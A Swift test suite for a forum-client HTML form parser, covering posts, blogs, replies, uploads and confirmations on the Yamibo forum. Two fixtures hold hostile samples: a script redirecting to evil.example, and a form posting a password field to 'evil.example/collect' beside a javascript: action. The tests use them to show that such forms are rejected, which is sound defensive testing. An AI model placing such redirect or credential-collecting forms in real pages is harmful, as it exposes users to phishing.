import Foundation
import Testing
@testable import YamiboXCore

@Suite struct ForumFormPageParserTests {
    private let baseURL = URL(string: "https://bbs.yamibo.com/forum.php?mod=post&action=newthread&fid=16")!

    @Test func generalPageContentIsNeverExtracted() throws {
        let page = try ForumFormPageParser.parse(html: """
        <html><head><title>公告 - 百合会</title></head><body>
        <div id="hd">Header<form id="loginform"><input name="username"></form></div>
        <div id="ct"><h1>欢迎光临</h1><p>论坛<strong>规则</strong></p>
        <p><a href="thread-123-1-1.html">阅读规则</a></p><img src="images/banner.jpg">
        <script>location.href='https://evil.example';</script></div><div id="ft">Footer</div></body></html>
        """, url: baseURL)
        #expect(page.title == "公告")
        #expect(page.forms.isEmpty)
        #expect(page.message == nil)
        #expect(page.continuationURL == nil)
    }

    @Test func postFormPreservesWhitespaceTokensOptionsAndSelectedSubmitButton() throws {
        let page = try ForumFormPageParser.parse(html: Self.postHTML, url: baseURL)
        let form = try #require(page.forms.first)
        #expect(form.kind == .thread)
        #expect(form.actionURL.absoluteString == "https://bbs.yamibo.com/forum.php?mod=post&action=newthread&fid=16&topicsubmit=yes")
        #expect(form.hiddenValues.contains(.init(name: "formhash", value: "fixture-token")))
        #expect(!form.fields.contains { $0.name == "checkbox" || $0.name.hasPrefix("e_") || $0.name == "disabled" })
        let message = try #require(form.fields.first { $0.name == "message" })
        #expect(message.initialValues == ["first\n  second & third"])
        let permissions = try #require(form.fields.first { $0.name == "readperm" })
        #expect(permissions.options.map(\.value) == ["", "1", "10"])
        let button = try #require(form.buttons.first)
        let fields = try form.submissionValues(values: form.initialValues, buttonID: button.id)
        #expect(fields.contains(.init(name: "topicsubmit", value: "true")))
        #expect(fields.contains(.init(name: "wysiwyg", value: "0")))
        #expect(!fields.contains(.init(name: "wysiwyg", value: "1")))
        #expect(fields.contains(.init(name: "usesig", value: "1")))
        #expect(!fields.contains { $0.name == "hiddenreplies" })
        #expect(fields.contains(.init(name: "save", value: "")))
        let save = try #require(form.buttons.last)
        #expect(try form.submissionValues(values: form.initialValues, buttonID: save.id).contains(.init(name: "save", value: "1")))
    }

    @Test func blogFormIncludesHiddenEditorBodyAndPrivacyFields() throws {
        let page = try ForumFormPageParser.parse(html: """
        <div id="ct"><form id="ttHtmlEditor" method="post" action="home.php?mod=spacecp&amp;ac=blog&amp;blogid=">
        <input name="subject" value="A title"><textarea name="message" style="display:none">&lt;p&gt;正文&lt;/p&gt;</textarea>
        <table><tr><th>个人分类</th><td><select name="classid"><option value="0">无分类</option><option value="addoption">新增</option></select></td></tr></table>
        <select name="friend"><option value="0">公开</option><option value="3" selected>仅自己</option></select>
        <input name="password"><textarea name="target_names"></textarea>
        <label><input type="checkbox" name="noreply" value="1">不允许评论</label>
        <input name="formhash" type="hidden" value="fixture-token"><input type="hidden" name="blogsubmit" value="true">
        <button type="submit">保存发布</button></form></div>
        """, url: YamiboRoute.userSpaceBlogEditor.url)
        let form = try #require(page.forms.first)
        #expect(form.kind == .blog)
        #expect(form.fields.first { $0.name == "message" }?.initialValues == ["<p>正文</p>"])
        #expect(form.fields.first { $0.name == "friend" }?.initialValues == ["3"])
        #expect(form.fields.first { $0.name == "classid" }?.options.map(\.value) == ["0"])
        let button = try #require(form.buttons.first)
        #expect(button.values.isEmpty)
        #expect(try form.submissionValues(values: form.initialValues, buttonID: button.id).contains(.init(name: "blogsubmit", value: "true")))
    }

    @Test func duplicateFieldNamesAndMultiselectRemainRepeated() throws {
        let html = """
        <form method="post" action="home.php?mod=spacecp&amp;ac=privacy">
        <input type="hidden" name="formhash" value="fixture-token">
        <label><input type="checkbox" name="privacy[]" value="one" checked>One</label>
        <label><input type="checkbox" name="privacy[]" value="two" checked>Two</label>
        <select name="groups[]" multiple><option value="a" selected>A</option><option value="b" selected>B</option><option value="c" disabled>C</option></select>
        <input name="readonly" value="original" readonly><fieldset disabled><input name="ignored" value="bad"></fieldset>
        <button name="save" value="true">保存</button></form>
        """
        let form = try #require(ForumFormPageParser.parse(html: html, url: baseURL).forms.first)
        var values = form.initialValues
        let readOnly = try #require(form.fields.first { $0.name == "readonly" })
        values[readOnly.id] = ["changed"]
        let result = try form.submissionValues(values: values, buttonID: form.buttons[0].id)
        #expect(result.filter { $0.name == "privacy[]" }.map(\.value) == ["one", "two"])
        #expect(result.filter { $0.name == "groups[]" }.map(\.value) == ["a", "b"])
        #expect(result.contains(.init(name: "readonly", value: "original")))
        #expect(!result.contains { $0.name == "ignored" })
    }

    @Test func validationRejectsMissingTitleAndInventedChoices() throws {
        let form = try #require(ForumFormPageParser.parse(html: Self.postHTML, url: baseURL).forms.first)
        let subject = try #require(form.fields.first { $0.name == "subject" })
        let permission = try #require(form.fields.first { $0.name == "readperm" })
        var values = form.initialValues
        values[subject.id] = [" "]
        #expect(throws: ForumPageError.requiredField(subject.label)) {
            try form.submissionValues(values: values, buttonID: form.buttons[0].id)
        }
        values = form.initialValues
        values[permission.id] = ["9999"]
        #expect(throws: ForumPageError.invalidForm) {
            try form.submissionValues(values: values, buttonID: form.buttons[0].id)
        }
    }

    @Test(arguments: ["", "Old reply title"])
    func editedReplySubjectIsHiddenPreservedAndNeverRequired(subject: String) throws {
        for script in ["var isfirstpost = 0;", "$('#needmessage').on('keyup input', function() {});", "var isfirstpost = check();"] {
            let url = URL(string: "https://bbs.yamibo.com/forum.php?mod=post&action=edit&tid=123&pid=456&mobile=2")!
            let html = """
            <script>\(script)</script>
            <form id="postform" method="post" action="forum.php?mod=post&amp;action=edit&amp;editsubmit=yes">
            <input name="formhash" type="hidden" value="fixture"><input id="needsubject" name="subject" value="\(subject)" required>
            <textarea name="message">Reply body</textarea><button>Save</button></form>
            """
            let form = try #require(ForumFormPageParser.parse(html: html, url: url).forms.first)
            #expect(!form.fields.contains { $0.name == "subject" })
            var draft = form.initialValues
            draft["subject"] = ["Unwanted thread title change"]
            let values = try form.submissionValues(values: draft, buttonID: form.buttons[0].id)
            #expect(values.filter { $0.name == "subject" } == [.init(name: "subject", value: subject)])
            #expect(values.contains(.init(name: "message", value: "Reply body")))
        }
    }

    @Test(arguments: ["var isfirstpost = 1;", "$('#needsubject').on('keyup input', function() {});"])
    func editedFirstPostKeepsEditableRequiredSubject(script: String) throws {
        let url = URL(string: "https://bbs.yamibo.com/forum.php?mod=post&action=edit&tid=123&pid=456")!
        let html = """
        <script>\(script)</script>
        <form id="postform" method="post" action="forum.php?mod=post&amp;action=edit&amp;editsubmit=yes">
        <input name="subject" value="Original"><textarea name="message">Body</textarea><button>Save</button></form>
        """
        let form = try #require(ForumFormPageParser.parse(html: html, url: url).forms.first)
        let subject = try #require(form.fields.first { $0.name == "subject" })
        #expect(subject.isRequired)
        #expect(!subject.isReadOnly)
        var draft = form.initialValues
        draft[subject.id] = ["Updated title"]
        #expect(try form.submissionValues(values: draft, buttonID: form.buttons[0].id).contains(.init(name: "subject", value: "Updated title")))
        draft[subject.id] = [""]
        #expect(throws: ForumPageError.requiredField(subject.label)) {
            try form.submissionValues(values: draft, buttonID: form.buttons[0].id)
        }
    }

    @Test func newReplyDoesNotExposeSubjectEvenWhenFirstPostFlagIsPresent() throws {
        let url = URL(string: "https://bbs.yamibo.com/forum.php?mod=post&action=reply&tid=123")!
        let form = try #require(ForumFormPageParser.parse(html: """
        <script>var isfirstpost = 1;</script>
        <form id="postform" method="post" action="forum.php?mod=post&amp;action=reply&amp;tid=123">
        <input name="subject" value="Original"><textarea name="message">Body</textarea><button>Reply</button></form>
        """, url: url).forms.first)
        #expect(!form.fields.contains { $0.name == "subject" })
        #expect(form.hiddenValues.contains(.init(name: "subject", value: "Original")))
    }

    @Test func desktopUploaderFormsAndHiddenMenuChromeAreNotNativeForms() throws {
        let page = try ForumFormPageParser.parse(html: """
        <div id="ct"><div id="pt">Desktop breadcrumb</div>
        <form id="postform" action="forum.php?mod=post&amp;action=newthread" method="post">
        <input name="subject" value="Title"><textarea name="message">Body</textarea>
        <input type="hidden" name="formhash" value="fixture"><button>发表帖子</button></form>
        <div id="e_menus"><p>Choose File upload helper</p>
        <form id="imgattachform" action="misc.php?mod=swfupload"><input type="file" name="Filedata"><button>upload</button></form>
        <form id="attachform_1" action="misc.php?mod=swfupload"><input type="file" name="Filedata"><button>upload</button></form></div>
        <form id="imgattachform_1" action="misc.php?mod=swfupload"><input type="file" name="Filedata"><button>upload</button></form>
        </div>
        """, url: baseURL)
        #expect(page.forms.map(\.id) == ["postform"])
        #expect(page.forms[0].fields.map(\.name) == ["subject", "message"])
        #expect(page.forms[0].instructions.isEmpty)
    }

    @Test func legitimateMultipartFieldsRemainAvailableWithLocalizedLabels() throws {
        let page = try ForumFormPageParser.parse(html: """
        <form id="fileform" action="home.php?mod=spacecp&amp;ac=upload" method="post">
        <input type="hidden" name="formhash" value="fixture"><input type="file" name="Filedata" required>
        <input type="file" name="another_unlabeled_file"><button>上传</button></form>
        """, url: baseURL)
        let form = try #require(page.forms.first)
        #expect(form.fields.map(\.name) == ["Filedata", "another_unlabeled_file"])
        #expect(form.fields.allSatisfy { $0.kind == .file && $0.label == L10n.string("forum.native.attachments") })
        #expect(form.fields[0].isRequired)
    }

    @Test func externalAndScriptFormsNeverBecomeSubmitActions() throws {
        let page = try ForumFormPageParser.parse(html: """
        <div id="ct"><h1>Page</h1>
        <form method="post" action="https://evil.example/collect"><input name="password"><button>Save</button></form>
        <form method="post" action="javascript:send()"><button>Save</button></form></div>
        """, url: baseURL)
        #expect(page.forms.isEmpty)
    }

    @Test func ajaxFriendConfirmationIsNativeAndDestructive() throws {
        let url = URL(string: "https://bbs.yamibo.com/home.php?mod=spacecp&ac=friend&op=ignore&uid=42")!
        let page = try ForumFormPageParser.parse(html: """
        <root><![CDATA[<form method="post" action="home.php?mod=spacecp&ac=friend&op=ignore&uid=42">
        <div class="c">确定删除好友？</div><input name="formhash" value="fixture-token" type="hidden">
        <input name="friendsubmit" type="hidden" value="true"><button type="submit">确定</button></form>]]></root>
        """, url: url)
        let form = try #require(page.forms.first)
        #expect(form.isDestructive)
        #expect(!form.instructions.isEmpty)
    }

    @Test func refreshIsOnlyAnExplicitContinuationLink() throws {
        let page = try ForumFormPageParser.parse(html: """
        <html><head><meta http-equiv="refresh" content="1;url=forum.php?mod=viewthread&amp;tid=123"></head>
        <body><div id="messagetext">发表成功</div></body></html>
        """, url: baseURL)
        #expect(page.message == "发表成功")
        #expect(page.continuationURL?.absoluteString == "https://bbs.yamibo.com/forum.php?mod=viewthread&tid=123")
    }

    private static let postHTML = """
    <html><head><title>发表帖子 - 百合会</title></head><body><div id="ct">
    <form id="postform" method="post" action="forum.php?mod=post&amp;action=newthread&amp;fid=16&amp;topicsubmit=yes">
    <input name="formhash" type="hidden" value="fixture-token"><input name="posttime" type="hidden" value="123">
    <input name="wysiwyg" type="hidden" value="1"><input name="subject" value="Test title" maxlength="255">
    <label><input type="checkbox" name="checkbox" value="0">纯文本</label>
    <textarea name="message" style="display:none">first
      second &amp; third</textarea>
    <input type="radio" name="e_collapse_radio" checked><input name="disabled" value="bad" disabled>
    <select name="readperm"><option value="">不限</option><option value="1">A</option><option value="1">B</option><option value="10">C</option></select>
    <label><input name="hiddenreplies" type="checkbox" value="1">仅作者</label>
    <label><input name="usesig" type="checkbox" value="1" checked>签名</label>
    <button type="submit" name="topicsubmit" value="true">发表帖子</button><input name="save" value="" type="hidden">
    <button type="button">保存草稿</button></form></div></body></html>
    """
}
